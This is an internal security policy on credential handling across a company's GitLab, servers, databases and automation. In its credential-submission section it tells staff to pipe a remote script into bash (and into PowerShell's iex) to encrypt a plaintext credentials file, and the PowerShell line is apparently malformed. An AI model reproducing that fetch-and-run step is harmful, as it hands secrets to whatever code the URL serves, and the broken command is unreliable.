## Introduction

This section defines the practices for handling passwords, keys, and access credentials across CARA COM MY systems.  
It covers shared services such as GitLab, servers, databases, and automation tools.

<Warning>
  It does **not** apply to personal or company-issued laptops, email accounts,
  or end-user device logins.
</Warning>

## GitLab Account Security

<Note>
  Applies to: All *developers* and *administrators* with GitLab access
</Note>

- All GitLab accounts (old and new instances) must be protected with **multi-factor authentication (MFA)**.
- Personal access tokens must not be shared between users.

## Server Access Security

<Note>
  Applies to: *Server Administrators* and *Developers* with server access
</Note>

- **No root login with password** is allowed.
- Each server must have a **unique, randomly generated password** (if password authentication is enabled).
- The same default password must not be reused across servers.
- The default username may remain `cara`, but the password must be unique.
- All developers must use **SSH public key authentication** for server access.
- Each developer is assigned their own user account â€” no shared accounts allowed.

## Service & Instance Access Security

<Note>
  Applies to: Any service instance (e.g., MySQL, Redis, PostgreSQL,
  Elasticsearch, etc.)
</Note>

- Default or generic credentials (e.g., `root`, `admin/admin`, empty passwords) must not be used.
- Each instance must have a unique password, different from other services.
- Application services cannot connect to instances using a `root` or `admin` account.
- When new credentials are created, they must be sent securely to the MIS/IT Security team:

  - Save the credentials in a `.txt` file (structure is flexible but should be easy to read).
  - Encrypt the file using the company-provided encryption tool:

        - The tool already has the MIS public key hardcoded.
        - Usage example:

          <Tabs>

            <Tab title="Linux or macOS">

              You can encrypted using the provided tool from MIS team like bellow:
              ```bash HelloWorld.sh
                curl -sL https://company.com/encrypt_credentials.sh | bash -s credentials.txt
              ```

            </Tab>

            <Tab title="Windows">

              You can encrypted using the provided tool from MIS team like bellow:
              ```powershell HelloWorld.exe
                iwr https://company.com/encrypt_credentials.ps1 -UseBasicParsing | iex -ArgumentList 'credentials.txt'
              ```

            </Tab>

          </Tabs>

- Send the encrypted file via email to the MIS team.
- The MIS team will decrypt the file using their private key.

<Info>
  If the process is not followed correctly, MIS may request the credentials to
  be resent.
</Info>

## Service-to-Service Authentication

<Note>Applies to: Servers, CI/CD pipelines, and automation tools</Note>

- For accessing Git repositories, image registries, or package registries from servers or automation systems:
  - Use **deploy keys**.
  - Do **not** use personal access tokens for server deployments or automated workflows.

## Summary

This section ensures that passwords and keys are handled securely across GitLab, servers, service instances, and automation systems.  
Following these practices protects our systems against credential theft and unauthorized access.
